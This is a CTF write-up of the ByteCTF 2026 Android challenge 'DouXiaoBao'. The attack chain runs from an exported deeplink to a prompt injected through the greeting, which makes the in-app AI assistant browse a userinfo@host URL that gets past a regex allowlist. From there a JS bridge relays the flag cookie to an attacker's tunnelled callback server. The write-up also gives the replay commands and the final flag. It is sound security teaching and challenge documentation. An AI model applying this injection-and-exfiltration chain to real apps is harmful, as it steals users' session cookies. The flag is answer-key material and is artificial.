# DouXiaoBao

## Metadata

- Event: ByteCTF 2026
- Category: Mobile and Android
- Pattern: exported deeplink to AI tool browsing, WebView allowlist confusion,
  and JS bridge cookie relay
- Knowledge link:
  [ctf-knowledge-mobile.md#webview-tool-browsing-with-userinfo-allowlist-confusion](ctf-knowledge-mobile.md#webview-tool-browsing-with-userinfo-allowlist-confusion)
- Local solution:
  [solution note](../../../engagements/ctf-2026-douxiaobao/notes/solution.md)

## Prompt Summary

The service runs an Android emulator with DouXiaoBao installed. The player
submits one deeplink after a PoW. The app has an AI assistant that can browse
news URLs, and the flag is injected as a WebView cookie for `m.toutiao.com`.

## Signals

- `com.bytectf.douxiaobao` exposes a `douxiaobao://campaign` activity.
- `CampaignActivity` parses attacker-controlled `config.action` with
  `Intent.parseUri` and starts it.
- `ChatActivity` accepts a `greeting` extra and sends it into the AI chat flow.
- The `browse_url` tool checks URLs with a prefix-style Toutiao regex.
- `https://m.toutiao.com@host/path` passes the regex but WebView requests
  `host`.
- `window.jsb.fetchPersonalizedContent(url)` checks the current WebView URL,
  reads cookies through `CookieManager`, and sends them to the callback.

## Route

1. Capture the submission page and APK.
2. Use `ctf_mobile.py apk-summary` and `jadx-decompile` to inspect the manifest
   and WebView code.
3. Confirm that `CampaignActivity` can launch `ChatActivity` with a controlled
   `greeting`.
4. Start an HTTPS reverse tunnel to a local `ctf_oob.py serve` callback.
5. Host a payload page at the tunnel. The payload calls
   `window.jsb.fetchPersonalizedContent(callback)` and then navigates the
   WebView to `http://m.toutiao.com/`.
6. Submit a deeplink whose `greeting` instructs the assistant to use
   `browse_url` on `https://m.toutiao.com@<tunnel>/<nonce>`.
7. Read the callback log. The native bridge sends
   `data=session_token=flag{...}; ...`.

## Replay Commands

```bash
python scripts/sec.py probe mobile apk-summary \
  --apk test-reports/ctf-2026_douxiaobao.apk \
  --output engagements/ctf-2026-douxiaobao/artifacts/douxiaobao-apk-apk-summary.json

python scripts/sec.py probe mobile jadx-decompile \
  --apk test-reports/ctf-2026_douxiaobao.apk \
  --output-dir engagements/ctf-2026-douxiaobao/files/douxiaobao-jadx \
  --output engagements/ctf-2026-douxiaobao/artifacts/douxiaobao-jadx-jadx.json

python scripts/sec.py probe web serve \
  --label cookie-callback-v5 \
  --host 0.0.0.0 \
  --port 8001 \
  --response-file engagements/ctf-2026-douxiaobao/files/payload.html \
  --response-type text/html
```

## False Leads

- Treating the regex allowlist as hostname validation. The `userinfo@host`
  syntax changes the real destination host.
- Calling the JS bridge only after navigating away from the payload page; the
  remote page loses its JavaScript context.
- Using `https://m.toutiao.com/` as the navigation target after the bridge call
  when the injected cookie is scoped to the HTTP URL in this app.

## Final

`flag{Wow_y0u_4r3_4ndr01d_m4st3r!!!}`
